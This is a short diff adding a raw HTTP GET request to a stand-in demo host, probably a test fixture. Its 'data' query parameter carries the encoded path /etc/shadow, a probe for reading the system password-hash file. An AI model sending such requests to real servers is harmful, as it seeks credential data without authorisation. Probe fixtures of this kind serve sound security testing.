@@ -1,0 +1,4 @@
+GET /a?data=%2Fetc%2Fshadow HTTP/1.1
+Host: demo.example.com
+Connection: close
+
